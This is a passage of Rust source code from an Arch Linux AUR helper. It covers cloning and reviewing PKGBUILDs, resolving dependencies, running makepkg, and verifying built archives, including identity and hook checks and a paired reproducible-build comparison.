        reviewed_digest.verify(&pkg_dir)?;
        let status = self
            .run_build(&pkg_dir, &env, package, &reviewed_digest)
            .await
            .with_context(|| format!("Failed to run makepkg for '{package}'"))?;
        if !status.success() {
            anyhow::bail!(
                "{}",
                Self::historical_build_failure_message(
                    package,
                    version,
                    &self.build_dir.join("_logs"),
                )
            );
        }

        let mut archives =
            Self::find_built_packages(&pkg_dir, &env.pkgdest, &[package.to_string()])
                .await
                .map_err(|_| AurError::PackageArchiveNotFound(package.to_string()))?;
        let Some(archive) = archives.pop() else {
            return Err(AurError::PackageArchiveNotFound(package.to_string()).into());
        };

        crate::cli::modern_ui::print_info(&format!("Installing {package} {version}"));
        let archives = self
            .authorize_with_paired_build(
                &[archive],
                &reviewed_digest,
                &base,
                &[package.to_owned()],
                &[package.to_owned()],
                false,
                &pkg_dir,
                &env,
            )
            .await?;
        Self::install_built_packages(std::slice::from_ref(&archives), sudoloop.as_ref()).await?;
        crate::cli::modern_ui::print_success(&format!("Installed {package} {version}"));
        // Use async cleanup on success and report failures. The owner also
        // attempts cleanup on error/cancellation; logs remain outside this tree.
        if let Err(error) = tokio::fs::remove_dir_all(&repo_dir).await {
            tracing::warn!(
                "Rollback of '{package}' succeeded but its worktree {} could not be removed: {error:#}",
                repo_dir.display()
            );
        }
        Ok(())
    }

    pub async fn install(&self, package: &str) -> Result<()> {
        crate::core::security::validate_package_name(package)?;
        // Build the package *base* (split packages share one PKGBUILD and one
        // checkout), but install only the output the user asked for. Installing
        // every sibling output of the base would mutate the system beyond the
        // request.
        let requested = vec![package.to_string()];
        let mut jobs = self.build_jobs_for_updates(&requested).await?;
        let job = jobs
            .pop()
            .context("AUR returned no build plan for the requested package")?;
        self.install_package_outputs(&job.package, &[package.to_string()])
            .await
    }

    pub(crate) async fn preacquire_install_privileges(package: &str, purpose: &str) -> Result<()> {
        if crate::core::caps::can_write_pacman_db() {
            return Ok(());
        }

        if !console::user_attended() {
            let true_program = crate::core::privilege::root_controlled_program_path("true")?;
            let status = crate::core::privilege::sudo_command()?
                .args(["-n", "--"])
                .arg(true_program)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await
                .context("Failed to check non-interactive sudo availability")?;
            if !status.success() {
                anyhow::bail!(
                    "{purpose} for '{package}' needs sudo, but this non-interactive session does not have passwordless sudo"
                );
            }
        }

        let status = crate::core::privilege::sudo_command()?
            .arg("-v")
            .stdin(std::process::Stdio::inherit())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::inherit())
            .status()
            .await
            .with_context(|| format!("Failed to acquire sudo credentials for {purpose}"))?;
        if !status.success() {
            anyhow::bail!("Failed to acquire sudo credentials for {purpose} of '{package}'");
        }
        Ok(())
    }

    pub(crate) async fn authorize_package_outputs(
        &self,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<AuthorizedBuild> {
        crate::core::security::validate_package_name(package)?;
        if requested_outputs.is_empty() {
            anyhow::bail!("AUR build plan for '{package}' has no package outputs");
        }
        for output in requested_outputs {
            crate::core::security::validate_package_name(output)?;
        }
        require_unprivileged_builder(package, crate::core::is_root())?;

        let lifecycle_guard = self.acquire_build_lifecycle().await?;
        let package_lock = self.package_base_lock(package);
        let _package_checkout_guard = package_lock.lock().await;
        create_dir_as_user(&self.build_dir).await?;
        let _package_checkout_file_guard = self.acquire_package_base_file_lock(package).await?;
        let pkg_dir = validate_build_dir(&self.build_dir, package)?;

        if pkg_dir.exists() {
            let pull_pb =
                crate::cli::modern_ui::modern_spinner("Updating", &format!("{package} source"));
            if let Err(error) = self.git_pull(&pkg_dir).await {
                crate::cli::modern_ui::finish_clear(&pull_pb);
                tracing::warn!(
                    "Git pull failed for {package}: {error}. Recovering by recloning package repository."
                );
                remove_dir_as_user(&pkg_dir)
                    .await
                    .map_err(|cleanup_error| {
                        tracing::warn!(
                            "Failed to remove stale AUR cache for {package}: {cleanup_error}"
                        );
                        AurError::GitPullFailed(package.to_string())
                    })?;
                let recover_pb = crate::cli::modern_ui::modern_spinner(
                    "Recovering",
                    &format!("{package} source checkout"),
                );
                self.git_clone(package).await.map_err(|clone_error| {
                    crate::cli::modern_ui::finish_clear(&recover_pb);
                    tracing::warn!("Recovery clone failed for {package}: {clone_error}");
                    AurError::GitPullFailed(package.to_string())
                })?;
                crate::cli::modern_ui::finish_success(&recover_pb, "Recovered", "source checkout");
            } else {
                crate::cli::modern_ui::finish_success(
                    &pull_pb,
                    "Updated",
                    &format!("{package} source"),
                );
            }
        } else {
            let clone_pb =
                crate::cli::modern_ui::modern_spinner("Cloning", &format!("{package} from AUR"));
            self.git_clone(package).await.map_err(|error| {
                crate::cli::modern_ui::finish_clear(&clone_pb);
                tracing::warn!("Git clone failed for {package}: {error}");
                AurError::GitCloneFailed(package.to_string())
            })?;
            crate::cli::modern_ui::finish_success(
                &clone_pb,
                "Cloned",
                &format!("{package} repository"),
            );
        }

        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package.to_string()).into());
        }
        let reviewed_digest = if self.settings.aur.review_pkgbuild {
            Self::review_pkgbuild(package, &pkgbuild_path, self.settings.aur.security_profile)
                .await?
        } else {
            ReviewedSource::capture(&pkg_dir)?
        };

        Ok(AuthorizedBuild {
            lifecycle_guard,
            package: package.to_string(),
            requested_outputs: requested_outputs.to_vec(),
            reviewed_digest,
        })
    }

    pub(crate) async fn install_package_outputs(
        &self,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<()> {
        let authorized = self
            .authorize_package_outputs(package, requested_outputs)
            .await?;
        Self::preacquire_install_privileges(&authorized.package, "AUR build").await?;
        let sudoloop = if crate::core::sudoloop::can_use_sudoloop() {
            tracing::debug!("Starting sudoloop for AUR build");
            Some(crate::core::sudoloop::SudoLoop::start())
        } else {
            None
        };
        let output_names = authorized.requested_outputs.join(", ");
        let archives = self
            .install_authorized_package_outputs(authorized, sudoloop.as_ref())
            .await?;
        crate::cli::modern_ui::print_info(&format!("Installing {output_names}"));
        Self::install_built_packages(std::slice::from_ref(&archives), sudoloop.as_ref()).await?;
        crate::cli::modern_ui::print_success(&format!("Installed {output_names}"));
        Ok(())
    }

    pub(crate) async fn install_authorized_package_outputs(
        &self,
        authorized: AuthorizedBuild,
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<BuiltPackages> {
        let AuthorizedBuild {
            lifecycle_guard: _lifecycle_guard,
            package,
            requested_outputs,
            reviewed_digest,
        } = authorized;
        let package_lock = self.package_base_lock(&package);
        let package_checkout_guard = package_lock.lock().await;
        let package_checkout_file_guard = self.acquire_package_base_file_lock(&package).await?;
        let pkg_dir = validate_build_dir(&self.build_dir, &package)?;
        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package).into());
        }
        reviewed_digest.verify(&pkg_dir)?;

        let pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;

        let mut env = self.makepkg_env(&pkg_dir).await?;
        set_reproducible_source_epoch(&mut env, &reviewed_digest)?;
        env.pgp_home = pgp_home;

        let dependency_plan = self
            .aur_dependency_plan(&reviewed_digest, &package, &requested_outputs)
            .await?;
        let package_outputs = dependency_plan.package_outputs;
        let mut dependency_builds =
            AHashSet::from_iter([package.clone(), Self::package_base_marker(&package)]);
        drop(package_checkout_file_guard);
        drop(package_checkout_guard);
        Self::install_official_dependencies(&dependency_plan.official_dependencies).await?;
        for dep in dependency_plan.aur_dependencies {
            crate::cli::modern_ui::print_info(&format!(
                "Installing AUR dependency for {package}: {dep}"
            ));
            let dep_packages = self
                .build_only(&dep, &mut dependency_builds, sudoloop)
                .await?;
            Self::install_built_packages(std::slice::from_ref(&dep_packages), sudoloop).await?;
            crate::cli::modern_ui::print_success(&format!("Installed dependency: {dep}"));
        }
        self.ensure_dependencies_satisfied(&reviewed_digest, &package_outputs)
            .await?;

        let _package_build_guard = package_lock.lock().await;
        let _package_build_file_guard = self.acquire_package_base_file_lock(&package).await?;

        // Best-effort pre-download: makepkg still fetches anything we miss.
        match reviewed_digest
            .optional_srcinfo()
            .map(|metadata| metadata.map_or_else(Vec::new, |info| http_sources(&info)))
        {
            Ok(sources) if sources.is_empty() => {}
            Ok(sources) => {
                let summary = download_sources(sources, &env.srcdest).await;
                if summary.failed > 0 {
                    tracing::warn!(
                        "Pre-downloaded {}/{} AUR sources for {package}; makepkg will retry the rest",
                        summary.succeeded,
                        summary.succeeded + summary.failed
                    );
                }
            }
            Err(error) => {
                tracing::warn!(
                    "Failed to parse AUR sources for {package}: {error}; makepkg will fetch them"
                );
            }
        }

        // Best-effort VCS mirroring: it warms SRCDEST for a later offline
        // rebuild, but a failure here is not fatal when networking is allowed.
        match reviewed_digest
            .optional_srcinfo()
            .map(|metadata| metadata.map_or_else(Vec::new, |info| vcs_sources(&info)))
        {
            Ok(vcs_sources) if !vcs_sources.is_empty() => {
                let summary = prefetch_vcs_sources(&vcs_sources, &env.srcdest).await;
                if !summary.needs_network.is_empty() {
                    tracing::debug!(
                        "VCS sources for {package} still need network at build time: {}",
                        summary.needs_network.join(", ")
                    );
                }
            }
            Ok(_) => {}
            Err(error) => {
                tracing::warn!("Failed to parse AUR VCS sources for {package}: {error}");
            }
        }

        reviewed_digest.verify(&pkg_dir)?;
        let log_path = self.build_log_path(&package);
        let status = self
            .run_build(&pkg_dir, &env, &package, &reviewed_digest)
            .await
            .with_context(|| format!("Failed to run makepkg for '{package}'"))?;
        if !status.success() {
            return Err(AurError::BuildFailed {
                package: package.clone(),
                log_path: log_path.display().to_string(),
            }
            .into());
        }

        let pkg_files = Self::find_built_packages(&pkg_dir, &env.pkgdest, &package_outputs)
            .await
            .map_err(|_| AurError::PackageArchiveNotFound(package.clone()))?;

        self.authorize_with_paired_build(
            &pkg_files,
            &reviewed_digest,
            &package,
            &package_outputs,
            &requested_outputs,
            true,
            &pkg_dir,
            &env,
        )
        .await
    }

    fn build_only<'a>(
        &'a self,
        package: &'a str,
        in_flight: &'a mut AHashSet<String>,
        sudoloop: Option<&'a crate::core::sudoloop::SudoLoop>,
    ) -> BoxFuture<'a, Result<BuiltPackages>> {
        async move {
            Self::enter_dependency_build(in_flight, package)?;
            let package_base = match self.resolve_package_base(package).await {
                Ok(package_base) => package_base,
                Err(error) => {
                    in_flight.remove(package);
                    return Err(error);
                }
            };
            let base_marker = Self::package_base_marker(&package_base);
            if let Err(error) = Self::enter_package_base(in_flight, &package_base) {
                in_flight.remove(package);
                return Err(error);
            }

            let result = self
                .build_only_inner(package, &package_base, in_flight, sudoloop)
                .await;
            in_flight.remove(&base_marker);
            in_flight.remove(package);
            result
        }
        .boxed()
    }

    fn enter_dependency_build(in_flight: &mut AHashSet<String>, package: &str) -> Result<()> {
        if !in_flight.insert(package.to_string()) {
            anyhow::bail!("Circular AUR dependency detected while resolving '{package}'");
        }
        Ok(())
    }

    fn enter_package_base(in_flight: &mut AHashSet<String>, package_base: &str) -> Result<()> {
        if !in_flight.insert(Self::package_base_marker(package_base)) {
            anyhow::bail!(
                "Circular AUR package-base dependency detected while resolving '{package_base}'"
            );
        }
        Ok(())
    }

    #[instrument(skip(self, in_flight, sudoloop))]
    async fn build_only_inner(
        &self,
        package: &str,
        package_base: &str,
        in_flight: &mut AHashSet<String>,
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<BuiltPackages> {
        crate::core::security::validate_package_name(package)?;
        let package_lock = self.package_base_lock(package_base);
        let package_checkout_guard = package_lock.lock().await;

        // A dependency may be a split-package OUTPUT whose AUR repository is
        // named after its package base (e.g. `postgresql18-libs` lives in
        // `postgresql18.git`). Clone/build the base; cache and artifact
        // lookups stay scoped to the requested output.
        create_dir_as_user(&self.build_dir).await?;
        let package_checkout_file_guard = self.acquire_package_base_file_lock(package_base).await?;

        // SECURITY: Validate package directory is safe (prevents symlink attacks)
        let pkg_dir = validate_build_dir(&self.build_dir, package_base)?;
        let pkgbuild_path = pkg_dir.join("PKGBUILD");

        if pkg_dir.exists() && pkgbuild_path.exists() {
            if let Err(e) = self.git_pull(&pkg_dir).await {
                tracing::warn!(
                    "Git pull failed for {}: {}. Recovering by recloning package repository.",
                    package_base,
                    e
                );
                remove_dir_as_user(&pkg_dir).await.map_err(|cleanup_err| {
                    tracing::warn!(
                        "Failed to remove stale AUR cache for {}: {}",
                        package_base,
                        cleanup_err
                    );
                    AurError::GitPullFailed(package_base.to_string())
                })?;
                self.git_clone(package_base).await.map_err(|clone_err| {
                    tracing::warn!("Recovery clone failed for {}: {}", package_base, clone_err);
                    AurError::GitPullFailed(package_base.to_string())
                })?;
            }
        } else {
            if pkg_dir.exists() {
                // Surface cleanup failures: otherwise a stale directory that
                // cannot be removed surfaces as a confusing clone failure.
                if let Err(error) = remove_dir_as_user(&pkg_dir).await {
                    tracing::warn!(
                        "Failed to remove stale AUR directory {} before re-cloning: {}",
                        pkg_dir.display(),
                        error
                    );
                }
            }
            self.git_clone(package_base).await.map_err(|e| {
                tracing::warn!("Git clone failed for {}: {}", package_base, e);
                AurError::GitCloneFailed(package_base.to_string())
            })?;
        }

        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package.to_string()).into());
        }

        // Same hash seal as install_package_outputs: re-verify the reviewed
        // PKGBUILD right before this dependency build runs.
        let reviewed_digest = if self.settings.aur.review_pkgbuild {
            Self::review_pkgbuild(
                package_base,
                &pkgbuild_path,
                self.settings.aur.security_profile,
            )
            .await?
        } else {
            ReviewedSource::capture(&pkg_dir)?
        };
        let pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;

        let dependency_plan = self
            .aur_dependency_plan(&reviewed_digest, package, &[package.to_string()])
            .await?;
        let package_outputs = dependency_plan.package_outputs;
        drop(package_checkout_file_guard);
        drop(package_checkout_guard);
        Self::install_official_dependencies(&dependency_plan.official_dependencies).await?;
        for dependency in dependency_plan.aur_dependencies {
            crate::cli::modern_ui::print_info(&format!(
                "Installing AUR dependency for {package}: {dependency}"
            ));
            let archives = self.build_only(&dependency, in_flight, sudoloop).await?;
            Self::install_built_packages(std::slice::from_ref(&archives), sudoloop).await?;
            crate::cli::modern_ui::print_success(&format!("Installed dependency: {dependency}"));
        }
        self.ensure_dependencies_satisfied(&reviewed_digest, &package_outputs)
            .await?;

        let _package_build_guard = package_lock.lock().await;
        let _package_build_file_guard = self.acquire_package_base_file_lock(package_base).await?;
        let mut env = self.makepkg_env(&pkg_dir).await?;
        set_reproducible_source_epoch(&mut env, &reviewed_digest)?;
        env.pgp_home = pgp_home;
        reviewed_digest.verify(&pkg_dir)?;
        let log_path = self.build_log_path(package);
        let status = self
            .run_build(&pkg_dir, &env, package, &reviewed_digest)
            .await
            .with_context(|| format!("Failed to run makepkg for '{package}'"))?;

        if !status.success() {
            return Err(AurError::BuildFailed {
                package: package.to_string(),
                log_path: log_path.display().to_string(),
            }
            .into());
        }

        let pkg_files = Self::find_built_packages(&pkg_dir, &env.pkgdest, &package_outputs)
            .await
            .map_err(|_| AurError::PackageArchiveNotFound(package.to_string()))?;
        self.authorize_with_paired_build(
            &pkg_files,
            &reviewed_digest,
            package_base,
            &package_outputs,
            &[],
            true,
            &pkg_dir,
            &env,
        )
        .await
    }

    /// Resolve an AUR name (output or base) to its package base via one RPC
    /// lookup. Falls back to the input on any failure so offline callers keep
    /// their previous behavior instead of hard-failing.
    async fn resolve_package_base(&self, name: &str) -> Result<String> {
        match Self::rpc_info_chunk(std::slice::from_ref(&name.to_string())).await {
            Ok(response) => {
                let candidate = response
                    .results
                    .iter()
                    .find(|info| info.name == name)
                    .and_then(|info| info.package_base.as_deref());
                Self::validated_package_base(name, candidate)
            }
            Err(error) => {
                tracing::debug!(
                    "Could not resolve package base for {name}: {error}; using name as base"
                );
                Ok(name.to_string())
            }
        }
    }

    fn validated_package_base(name: &str, candidate: Option<&str>) -> Result<String> {
        let package_base = candidate.unwrap_or(name);
        crate::core::security::validate_package_name(package_base)
            .context("AUR returned an invalid package base")?;
        Ok(package_base.to_string())
    }

    async fn find_built_packages(
        _pkg_dir: &Path,
        pkgdest: &Path,
        expected_names: &[String],
    ) -> Result<Vec<PathBuf>> {
        let pkgdest = pkgdest.to_path_buf();
        let expected_names = expected_names.to_vec();

        tokio::task::spawn_blocking(move || {
            let mut packages = Vec::with_capacity(expected_names.len());
            for expected_name in &expected_names {
                let names = [expected_name.clone()];
                let package = Self::find_package_in_dir(&pkgdest, &names).with_context(|| {
                    format!("No package archive found for split-package output '{expected_name}'")
                })?;
                packages.push(package);
            }
            Ok(packages)
        })
        .await?
    }

    fn find_package_in_dir(path: &Path, expected_names: &[String]) -> Option<PathBuf> {
        let entries = std::fs::read_dir(path).ok()?;
        let mut best_match: Option<PathBuf> = None;
        let mut best_mtime = std::time::SystemTime::UNIX_EPOCH;

        for entry in entries.flatten() {
            // A recipe can leave a symlink that resolves only on the host.
            // Never follow it while discovering candidate build outputs.
            if !entry.file_type().ok().is_some_and(|kind| kind.is_file()) {
                continue;
            }
            let filename = entry.file_name().to_string_lossy().into_owned();
            if (filename.ends_with(".pkg.tar.zst") || filename.ends_with(".pkg.tar.xz"))
                && expected_names.iter().any(|name| {
                    filename.starts_with(name) && filename.chars().nth(name.len()) == Some('-')
                })
            {
                // Filename matching is only a candidate filter. The archive's
                // embedded identity is authoritative; unreadable or absent
                // metadata must never select an artifact for installation.
                let Ok(Some(parsed_name)) = Self::pkg_name_from_archive(&entry.path()) else {
                    continue;
                };
                if !expected_names.iter().any(|name| name == &parsed_name) {
                    continue;
                }

                // If multiple matches (shouldn't happen), take newest by mtime
                if let Ok(meta) = entry.metadata() {
                    if let Ok(mtime) = meta.modified()
                        && mtime > best_mtime
                    {
                        best_mtime = mtime;
                        best_match = Some(entry.path());
                    }
                } else if best_match.is_none() {
                    best_match = Some(entry.path());
                }
            }
        }
        best_match
    }

    fn pkg_name_from_archive(path: &Path) -> Result<Option<String>> {
        Self::pkg_name_and_version_from_archive_result(path)
            .map(|identity| identity.map(|(name, _)| name))
    }

    /// Extract `(pkgname, full-version)` from `.PKGINFO` content.
    fn parse_pkginfo_name_version(content: &str) -> Option<(String, String)> {
        // Tolerant line parser: alpm-pkginfo's schema requires a dozen
        // mandatory fields; rollback/cache identity checks only need these
        // two keys and must work even when other metadata is absent.
        let mut name: Option<String> = None;
        let mut version: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            match key.trim() {
                "pkgname" => {
                    if name.is_some() {
                        return None;
                    }
                    name = Some(value.trim().to_string());
                }
                "pkgver" => {
                    if version.is_some() {
                        return None;
                    }
                    version = Some(value.trim().to_string());
                }
                _ => {}
            }
        }
        Some((name?, version?))
    }

    /// Accept a complete, ordered set of cached outputs only when every
    /// archive's identity, version, package base, architecture, and install hook match the
    /// checkout. A matching cache key alone is not proof: both the key and
    /// archives live in a user-writable directory.
    #[cfg(test)]
    fn select_cached_artifacts(
        archives: Vec<PathBuf>,
        outputs: &[String],
        pkg_dir: &Path,
        package_base: &str,
    ) -> Option<Vec<PathBuf>> {
        if outputs.is_empty()
            || archives.len() != outputs.len()
            || !archives.iter().zip(outputs).all(|(archive, output)| {
                Self::cached_artifact_provenance_ok(archive, pkg_dir, package_base, output)
            })
        {
            tracing::warn!(
                "Rejecting cached build for {package_base}: incomplete outputs or archive identity/provenance mismatch"
            );
            return None;
        }
        Some(archives)
    }

    fn archive_architecture_approved(
        srcinfo: &alpm_srcinfo::SourceInfoV1,
        output: &str,
        architecture: &str,
    ) -> bool {
        if !super::utils::package_architecture_matches(std::env::consts::ARCH, architecture) {
            return false;
        }
        let Some(package) = srcinfo
            .packages
            .iter()
            .find(|package| package.name.to_string() == output)
        else {
            return false;
        };
        let architectures = package
            .architectures
            .as_ref()
            .unwrap_or(&srcinfo.base.architectures);
        match architectures {
            alpm_types::Architectures::Any => architecture == "any",
            alpm_types::Architectures::Some(architectures) => architectures
                .iter()
                .any(|candidate| candidate.to_string() == architecture),
        }
    }

    fn authorize_archives(
        paths: &[PathBuf],
        source: &ReviewedSource,
        base: &str,
        outputs: &[String],
        fresh: bool,
    ) -> Result<Vec<ArchiveSnapshot>> {
        let srcinfo = source.text(Path::new(".SRCINFO"))?;
        let expected_version =
            srcinfo_version(srcinfo).context("Missing reviewed package version")?;
        anyhow::ensure!(
            Self::srcinfo_pkgbase(srcinfo) == Some(base)
                && paths.len() == outputs.len()
                && !paths.is_empty(),
            "AUR output set/base does not match reviewed source"
        );
        let pkgbuild = source.text(Path::new("PKGBUILD"))?;
        // VCS recipes intentionally calculate pkgver during build. A changed
        // version still cannot change output names/base or approved root hooks.
        let dynamic_version = fresh
            && pkgbuild.lines().any(|line| {
                line.trim_start().starts_with("pkgver()")
                    || line.trim_start().starts_with("pkgver ()")
            });
        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(srcinfo);
        paths
            .iter()
            .zip(outputs)
            .map(|(path, output)| {
                let snapshot = ArchiveSnapshot::capture(path)?;
                let admission = artifact_inspector::inspect_archive(&snapshot.path())?;
                let inspection = admission.inspection();
                snapshot.verify_sha256(&inspection.archive_sha256)?;
                let identity = Self::cached_archive_identity(Path::new(&snapshot.handoff()))?
                    .context("Archive lacks package identity")?;
                anyhow::ensure!(
                    identity.name == *output
                        && identity.base == base
                        && (identity.version == expected_version || dynamic_version),
                    "AUR archive identity/version differs from reviewed source: {output}"
                );
                anyhow::ensure!(
                    inspection.package_name == identity.name
                        && inspection.package_base == identity.base
                        && inspection.package_version == identity.version,
                    "AUR inspection identity differs from package metadata: {output}"
                );
                let architecture = identity
                    .architecture
                    .as_deref()
                    .context("Archive lacks architecture")?;
                anyhow::ensure!(
                    architecture_metadata.as_ref().is_ok_and(|metadata| {
                        Self::archive_architecture_approved(metadata, output, architecture)
                    }),
                    "AUR archive architecture is not approved for this host"
                );
                let declared = Self::srcinfo_install_script(srcinfo, output);
                let expected_hook = declared
                    .as_deref()
                    .map(|path| source.text(Path::new(path)))
                    .transpose()?;
                anyhow::ensure!(
                    identity.install_script.as_deref() == expected_hook,
                    "AUR archive contains an undeclared or changed installation hook: {output}"
                );
                crate::core::security::audit::record_operation(
                    "aur_inspection",
                    &[
                        format!("source_manifest_sha256={}", source.digest),
                        inspection.audit_summary(),
                    ],
                    "succeeded",
                )?;
                Ok(snapshot)
            })
            .collect()
    }

    fn paired_build_cache_key(
        &self,
        source: &ReviewedSource,
        env: &MakepkgEnv,
        inspections: &[artifact_inspector::ArtifactInspection],
    ) -> String {
        let mut ordered = inspections.iter().collect::<Vec<_>>();
        ordered.sort_by(|left, right| left.package_name.cmp(&right.package_name));
        let method = format!("{:?}", self.settings.aur.build_method);
        let makepkg_args = self.makepkg_args().join("\0");
        let mut build_environment = env.extra_env.clone();
        build_environment.sort();
        let mut hash = Sha256::new();
        hash.update(b"omg-aur-paired-build-v1\0");
        for value in [
            source.digest.as_str(),
            env.makeflags.as_str(),
            method.as_str(),
            self.settings.aur.security_profile.as_str(),
            makepkg_args.as_str(),
            if self.settings.aur.secure_makepkg {
                "secure-makepkg"
            } else {
                "standard-makepkg"
            },
            if self.settings.aur.allow_network {
                "network-enabled"
            } else {
                "network-disabled"
            },
        ] {
            hash.update((value.len() as u64).to_le_bytes());
            hash.update(value.as_bytes());
        }
        for (key, value) in build_environment {
            hash.update((key.len() as u64).to_le_bytes());
            hash.update(key.as_bytes());
            hash.update((value.len() as u64).to_le_bytes());
            hash.update(value.as_bytes());
        }
        for inspection in ordered {
            for value in [
                inspection.package_name.as_str(),
                inspection.package_version.as_str(),
                inspection.archive_sha256.as_str(),
            ] {
                hash.update((value.len() as u64).to_le_bytes());
                hash.update(value.as_bytes());
            }
            hash.update(inspection.policy_version.to_le_bytes());
        }
        hex::encode(hash.finalize())
    }

    fn verify_paired_outputs(
        primary: &[artifact_inspector::ArtifactInspection],
        secondary: &[artifact_inspector::ArtifactInspection],
    ) -> Result<()> {
        let canonical = |items: &[artifact_inspector::ArtifactInspection]| {
            let mut values = items
                .iter()
                .map(|item| {
                    (
                        item.package_name.clone(),
                        item.package_version.clone(),
                        item.archive_sha256.clone(),
                    )
                })
                .collect::<Vec<_>>();
            values.sort_unstable();
            values
        };
        anyhow::ensure!(
            canonical(primary) == canonical(secondary),
            "High-risk AUR package did not reproduce byte-for-byte in an independent build"
        );
        Ok(())
    }

    async fn authorize_with_paired_build(
        &self,
        paths: &[PathBuf],
        source: &ReviewedSource,
        base: &str,
        outputs: &[String],
        requested_outputs: &[String],
        fresh: bool,
        pkg_dir: &Path,
        primary_env: &MakepkgEnv,
    ) -> Result<BuiltPackages> {
        anyhow::ensure!(
            requested_outputs
                .iter()
                .all(|output| outputs.contains(output)),
            "Requested AUR outputs must belong to the authorized build output set"
        );
        let primary = Self::authorize_archives(paths, source, base, outputs, fresh)?;
        let primary_inspections = primary
            .iter()
            .map(|archive| {
                artifact_inspector::inspect_archive(&archive.path())
                    .map(artifact_inspector::ArchiveAdmission::into_inspection)
            })
            .collect::<Result<Vec<_>>>()?;
        let profile = self.settings.aur.security_profile;
        self.settings.aur.validate_security_profile()?;
        for inspection in &primary_inspections {
            inspection.enforce_profile(profile)?;
        }
        if !primary_inspections
            .iter()
            .any(|inspection| inspection.requires_paired_build_for(profile))
        {
            return Ok(BuiltPackages {
                archives: primary,
                profile,
                requested_outputs: requested_outputs.iter().cloned().collect(),
            });
        }

        let cache_key = self.paired_build_cache_key(source, primary_env, &primary_inspections);
        let cache = PAIRED_BUILD_CACHE.get_or_init(|| Mutex::new(HashSet::new()));
        if cache
            .lock()
            .map_err(|_| anyhow::anyhow!("AUR paired-build cache lock was poisoned"))?
            .contains(&cache_key)
        {
            crate::core::security::audit::record_operation(
                "aur_paired_build",
                &[
                    format!("cache_key={cache_key}"),
                    "result=verified-cache".to_owned(),
                ],
                "succeeded",
            )?;
            return Ok(BuiltPackages {
                archives: primary,
                profile,
                requested_outputs: requested_outputs.iter().cloned().collect(),
            });
        }

        crate::cli::modern_ui::print_info(&format!(
            "Rebuilding AUR package {base} with separate output storage for exact comparison"
        ));
        source.verify(pkg_dir)?;
        let mut secondary_env = self.makepkg_env(pkg_dir).await?;
        set_reproducible_source_epoch(&mut secondary_env, source)?;
        secondary_env.pgp_home = Self::fetch_missing_pgp_keys(&pkg_dir.join("PKGBUILD")).await?;
        let status = self
            .run_build(pkg_dir, &secondary_env, base, source)
            .await?;
        anyhow::ensure!(
            status.success(),
            "Independent verification build failed for high-risk AUR package {base}"
        );
        let secondary_paths = Self::find_built_packages(pkg_dir, &secondary_env.pkgdest, outputs)
            .await
            .map_err(|_| AurError::PackageArchiveNotFound(base.to_owned()))?;
        let secondary = Self::authorize_archives(&secondary_paths, source, base, outputs, fresh)?;
        let secondary_inspections = secondary
            .iter()
            .map(|archive| {
                artifact_inspector::inspect_archive(&archive.path())
                    .map(artifact_inspector::ArchiveAdmission::into_inspection)
            })
            .collect::<Result<Vec<_>>>()?;

        // Reproducible Builds recommends rebuilding independently and comparing
        // the outputs; accepting only identical archive hashes makes the check
        // cover metadata, hooks, modes, and payload bytes together.
        // https://reproducible-builds.org/docs/plans/
        Self::verify_paired_outputs(&primary_inspections, &secondary_inspections)?;
        cache
            .lock()
            .map_err(|_| anyhow::anyhow!("AUR paired-build cache lock was poisoned"))?
            .insert(cache_key.clone());
        crate::core::security::audit::record_operation(
            "aur_paired_build",
            &[
                format!("source_manifest_sha256={}", source.digest),
                format!("cache_key={cache_key}"),
                format!("outputs={}", outputs.join(",")),
                "result=exact-match".to_owned(),
            ],
            "succeeded",
        )?;
        Ok(BuiltPackages {
            archives: primary,
            profile,
            requested_outputs: requested_outputs.iter().cloned().collect(),
        })
    }

    /// Retained metadata/hook regression checks. These are necessary but
    /// insufficient to establish provenance of the rest of an archive;
    /// production therefore never reuses these legacy cached archives.
    #[cfg(test)]
    fn cached_artifact_provenance_ok(
        archive: &Path,
        pkg_dir: &Path,
        package_base: &str,
        output: &str,
    ) -> bool {
        let srcinfo = match std::fs::read_to_string(pkg_dir.join(".SRCINFO")) {
            Ok(srcinfo) => srcinfo,
            Err(error) => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: unreadable .SRCINFO in {}: {error}; rejecting cache hit",
                    pkg_dir.display()
                );
                return false;
            }
        };
        let Some(expected_version) = srcinfo_version(&srcinfo) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO has no usable version; rejecting cache hit"
            );
            return false;
        };
        let Some(expected_base) = Self::srcinfo_pkgbase(&srcinfo) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO declares no pkgbase; rejecting cache hit"
            );
            return false;
        };
        if expected_base != package_base {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO pkgbase '{expected_base}' does not match package base '{package_base}'; rejecting cache hit"
            );
            return false;
        }

        let Some(identity) = (match Self::cached_archive_identity(archive) {
            Ok(identity) => identity,
            Err(error) => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: cannot read metadata from {}: {error}; rejecting cache hit",
                    archive.display()
                );
                return false;
            }
        }) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: {} has no readable .PKGINFO; rejecting cache hit",
                archive.display()
            );
            return false;
        };

        if identity.name != output
            || identity.version != expected_version
            || identity.base != package_base
        {
            tracing::warn!(
                "Cached artifact provenance for {output}: {} claims '{}' '{}' in base '{}', expected '{}' in base '{package_base}' from .SRCINFO; rejecting cache hit",
                archive.display(),
                identity.name,
                identity.version,
                identity.base,
                expected_version
            );
            return false;
        }

